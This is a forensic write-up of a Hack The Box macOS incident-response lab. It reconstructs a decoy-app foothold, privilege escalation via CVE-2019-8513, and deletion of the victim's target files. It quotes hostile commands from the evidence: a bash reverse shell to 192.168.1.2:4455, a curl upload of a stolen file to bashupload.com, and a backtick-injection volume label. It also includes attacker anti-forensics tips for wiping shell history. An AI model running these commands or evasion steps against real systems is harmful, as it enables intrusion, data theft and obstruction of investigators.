Date : 28/07/2026

Sherlock : GateKeeper (Digital Forensics and Incident Response)

.zip : `Gatekeeper.zip` - 70mb - password : hacktheblue, as usual for a HTB Sherlock

"Sherlock Scenario

Wika is a highly motivated pre-sales engineer dedicated to achieving his professional goals. To ensure his success, he carefully selected the best tools and applications to streamline his workflow. However, an unknown adversary was actively working against him, attempting to sabotage his efforts and block him from reaching his targets. Unfortunately, Wika’s systems were compromised, putting his progress at risk. In response, we secured his Mac device for a detailed forensic investigation to gather evidence and uncover the truth.

We need your expertise as a DFIR analyst to investigate the incident."



Host at collection: `wikas-Mac`, macOS `10.13.6` (17G66), user `wika` (501). Collection stamp `2025-02-04 02:26 EET` from `Mac_Live_Response`.

```bash
> 7z x -p'hacktheblue' Gatekeeper.zip -o Gatekeeper-analysis -y
> cat .../BasicInfo/sw_vers.txt
ProductName:	Mac OS X
ProductVersion:	10.13.6
BuildVersion:	17G66
```

Purple framing first: this is not a persistence campaign. It is a short hands-on intrusion — foothold app → user shell → LPE → steal/delete sales targets → light cleanup. Think Reel-style user execution, then a Mac LOLBin priv-esc instead of potato/certutil.

Why `funphotos.app`

The lure had to look like something a motivated pre-sales guy would actually open. “Fun photos” is low-friction social cover — not a pentester binary name, not `payload.app`. Launch Services shows `/Applications/funphotos.app` as an incomplete shell-script bundle (inode `2156084`), unsigned, almost no metadata. The Mach-O/script stub under `Contents/MacOS/funphotos` is tiny (~71 bytes). That is a launcher, not a full RAT.

Delivery side shows Safari pulling `funphotos.gz` from attacker HTTP (`192.168.1.2:8000`, also `127.0.0.1` / `192.168.1.28` staging). Pattern fits Gatekeeper quarantine bypass attempts via archive gymnastics — class of `CVE-2022-22616` (Safari/ZIP/BoM so `com.apple.quarantine` never sticks cleanly). Early `system.log` also shows repeated `funphotos` init failures / `CoreServicesUIAgent` kills — Gatekeeper friction before the successful run.

Blue juice for initial access is not “find the ELF.” It is: incomplete LS flags + App Translocation path + quarantine/URL strings for `funphotos.gz`.

```bash
> # App Translocation marks the successful user-assist execution window
SecTranslocateCreateSecureDirectoryForURL: .../AppTranslocation/.../funphotos.app
timestamp: 2025-02-03T21:09:51Z
```

That stamp is the foothold moment. ~41s later Unified Logs show `/usr/bin/whoami` — classic first command after a reverse shell lands. Operator, not Wika.

Attack chain

1. User execution of decoy app (`funphotos.app`) → reverse shell as `wika`
2. Discovery: `whoami`, `sw_vers`, `ls`, `tree`
3. Collection / attempted exfil of sales material
4. Tool ingress: `priv.zip` from `http://192.168.1.2:8000`
5. Build + run local LPE (`make`, `./bin/test`)
6. Root via Time Machine helper abuse (`CVE-2019-8513`)
7. Cleanup of toolkit + sabotage of Documents
8. Victim panics and Googles whether he was hacked

Bash history still holds the post-foothold script (bad OPSEC — more below):

```bash
whoami
sw_vers
...
curl bashupload.com -T mytarget.txt
curl -O http://192.168.1.2:8000/priv.zip
unzip priv.zip
cd priv
make
cd bin
./test
...
rm Targets.rtf
rm mytarget.txt
echo "Now it is okay, show me how you will achive your target"
```

ATT&CK shape without decorating every line: `T1204.002` → `T1059.004` → `T1048`/`T1567` attempt → `T1105` → `T1068` + `T1202` → `T1485` → weak `T1070.004`.

Exfil: `mytarget.txt`

Pre-sales context matters. `mytarget.txt` / `Targets.rtf` are the business crown jewels on this host — prospect/target notes, not `SAM`/`ntds.dit`.

Operator path:

```bash
curl bashupload.com -T mytarget.txt
```

That is opportunistic web exfil: push a local file to a public paste/upload service. No custom C2 staging required. From red perspective it is fast and disposable. From blue perspective it is loud if you have egress DNS/HTTP visibility (`bashupload.com`) and file-read + `curl` parented by an interactive shell that is not Terminal.app’s normal workflow.

We can confirm the *command*. We cannot confirm HTTP 200 success from this triage alone (no pcap). Treat as attempted collection/exfil with high intent confidence.

Later the same files are deleted — sabotage after theft (or after failed theft). Impact is dual: confidentiality attempt + availability hit on Wika’s target list.

Root on macOS: mount + `CVE-2019-8513`

`priv/` is not “all malware.” It is the LPE workshop unzipped from `priv.zip` (`Makefile`, `exp.m`, `bin/test`). `funphotos` was stage 0; `priv` is stage 1.

`./test` drives `hdiutil` to create/attach a malformed HFS+ image whose **volume label** is the injection string:

```text
disk`t*:1`
```

Why mount it?

`tmdiagnose` (Time Machine diagnostic helper) enumerates mounted volumes and builds shell commands from volume names. Backticks in the label become command substitution when that helper runs as a privileged path — classic indirect execution (`T1202`) against a LOLBin-style Apple utility, vulnerability tracked as `CVE-2019-8513`.

Observed Unified Log spine:

```text
21:13:50Z  /usr/bin/make
21:14:10Z  /Users/wika/priv/bin/test + hdiutil
21:14:12Z  hfs: mounted disk`t*:1` on disk3s1
21:14:14Z  tmdiagnose (euid 0) + “wait ~2min for the rooted shell”
21:15:07Z  [exploit] I am Groot!   ← root confirmed
```

Payload UUIDText also embeds the root callback pattern:

```text
/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/4455 0>&1' &
```

So: user shell on `:funphotos` C2 path → root shell toward `192.168.1.2:4455`. Same operator network, escalated integrity.

Red note: this only works on old enough macOS (here High Sierra `10.13.6`). Patch level is part of the kill chain, not flavor text.

Impact

Not ransomware. Not domain persistence. Objectives match the scenario text and the artifacts:

- steal or attempt to steal target notes (`mytarget.txt`)
- delete `Targets.rtf` and `mytarget.txt` so Wika cannot work the deal
- leave a taunt in the shell

That is targeted sabotage against a pre-sales workflow, optionally with intel theft. No LaunchAgent/Daemon plant found in the triage. Hit-and-run.

What the adversary could have done better (OPSEC)

They deleted `priv/` and `priv.zip` as root (`sudo` / euid 0 `rm -r priv` at `21:15:49Z`). That is incomplete anti-forensics.

Misses:

1. Bash history left intact — The biggest mistake that led from an amateur research on browser "how do I know if am hacked" to a DFIR case. the entire post-exploitation script is still in `User-wika-bash_History.txt` / `.bash_sessions`. On macOS that is free attribution of intent. Clear history, shred sessions, or never use an interactive logged shell (`HISTFILE=/dev/null`, memory-only, etc.).
2. Interacted with the victim’s day-job files in an obvious way — deleting both target documents guarantees the human notices within minutes. Quiet exfil without vandalism is harder to spot; sabotage without theft is louder; doing both is ego. The echo taunt is pure burn.
3. Victim Google search is the OPSEC report card — Safari history:

```text
how to know that am not hacked
```

Uneducated query, but it proves the operator failed hygiene: Wika felt compromise *without* recovering `bin/test`. T1070 does not restore missing Documents or erase a creepy Terminal line. Once the human is suspicious, DFIR gets invited — and Unified Logs still have mounts, `tmdiagnose`, `I am Groot!`, and the sudo rm line even if `priv/` is gone.

4. Loud LOLBin / helper abuse without blending - `hdiutil` + weird volume name + `tmdiagnose` in a burst is a detection gift if endpoint telemetry exists. On this box SIP/firewall posture was weak at collection time; still, the volume label alone is signature material.

5. Reuse of obvious infra — `192.168.1.2:8000` for staging and `:4455` for root shell. Fine on HTB lab flat network; terrible if you care about attribution clustering.

Better operator: foothold → quiet collection → encrypted egress → LPE if needed → wipe *histories and logs you can* → no taunt → no “delete the only files the victim lives in.”

**Blue Team** :

Start from operator artifacts:

```bash
# 1) OS + user scope
sw_vers.txt / passwd / Logged_In_Users

# 2) What did the human run?
Full_file_listing → funphotos.app
brctl/lsregister.txt → inode + incomplete flags

# 3) When did execution become a shell?
unifiedlog_iterator on logarchive → AppTranslocation / whoami / make / test

# 4) How did they escalate?
HFS mount of disk`t*:1` + tmdiagnose + “I am Groot!”

# 5) What was the business impact?
bash history + Documents deletions + Safari panic search
```

Disk image absence means we cannot hash `funphotos` / `test` today. We still reconstruct capability from logs. That is the DFIR lesson: deleting the workshop is not deleting the timeline.


One-line kill chain

`funphotos` decoy (Gatekeeper friction / CVE-2022-22616 class) → user reverse shell → `bashupload` attempt on `mytarget.txt` → `priv.zip` LPE → mount ``disk`t*:1` `` → `tmdiagnose`/`CVE-2019-8513` root → delete toolkit + targets → victim Googles “how to know that am not hacked”.

---

**Adversary/Purple** view :

The adversary could've made the DFIR case a lot slower and more difficult with just simple hygiene :

```bash
history -c
rm -f ~/.bash_history
rm -rf ~/.bash_sessions/*
export HISTFILE=/dev/null
unset HISTFILE
```
Which would've removed the `~/.bash_history` (Linux-like hygiene) as well as the `.bash_sessions/*` which is Mac OS exploitation hygiene that removes the session metadata and the per-terminal session history on Mac OS as well as stop writing history for the rest of the session with `HISTFILE=/dev/null`.

However, even without history, the case holds : `App Translocation` → `whoami` → disk`t*:1` → exploit `Groot root access` → `rm -r priv`.

`Unified Logging` which is specific to Apple's Operating Systems would still find most if not all the forensic evidence in bash history and its wipe is in a way possible with root + hygiene, but takes more time, is loud, and often incomplete. So if the adversary couldn't even think of deleting bash_history, he would have a lot of trouble deleting the `Unified Logging` system that the DFIR team would use in case that happened.
